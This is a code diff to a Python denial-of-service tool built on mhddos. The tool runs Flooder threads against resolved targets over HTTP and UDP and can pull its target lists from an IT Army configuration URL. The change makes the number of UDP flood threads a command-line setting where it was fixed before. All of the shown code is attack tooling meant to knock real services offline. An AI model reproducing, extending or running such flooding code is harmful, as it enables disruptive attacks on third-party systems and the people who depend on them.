@@ -11,7 +11,7 @@ from threading import Event, Lock, Thread
 from time import sleep, time
 
 from src.cli import init_argparse
-from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
+from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL
 from src.dns_utils import resolve_all_targets
 from src.mhddos import main as mhddos_main
 from src.output import AtomicCounter, show_statistic, print_banner, print_progress
@@ -105,7 +105,8 @@ def run_ddos(
     http_methods,
     vpn_mode,
     debug,
-    table
+    table,
+    udp_threads,
 ):
     threads_per_target = total_threads // len(targets)
     statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
@@ -135,7 +136,7 @@ def run_ddos(
         assert target.is_resolved, "Unresolved target cannot be used for attack"
         # udp://, method defaults to "UDP"
         if target.is_udp:
-            register_params(Params(target, target.method or 'UDP', UDP_THREADS), udp_kwargs_list)
+            register_params(Params(target, target.method or 'UDP', udp_threads), udp_kwargs_list)
         # Method is given explicitly
         elif target.method is not None:
             register_params(Params(target, target.method, threads_per_target), kwargs_list)
@@ -157,7 +158,7 @@ def run_ddos(
     for _ in range(total_threads):
         thread_pool.submit(Flooder(event, kwargs_iter))
     if udp_kwargs_list:
-        for _ in range(UDP_THREADS):
+        for _ in range(udp_threads):
             udp_thread_pool.submit(Flooder(event, udp_kwargs_iter))
     event.set()
 
@@ -195,9 +196,7 @@ def start(args):
     udp_thread_pool = DaemonThreadPool()
     # It is possible that not all threads were started
     total_threads = thread_pool.start(args.threads)
-    # XXX: most likely we don't need more than a single UDP thread
-    # but this needs to be verified properly
-    udp_thread_pool.start(UDP_THREADS)
+    udp_thread_pool.start(args.udp_threads)
     if args.itarmy:
         targets_iter = Targets([], IT_ARMY_CONFIG_URL)
     else:
@@ -247,7 +246,8 @@ def start(args):
             args.http_methods,
             args.vpn_mode,
             args.debug,
-            args.table
+            args.table,
+            args.udp_threads,
         )
 
 
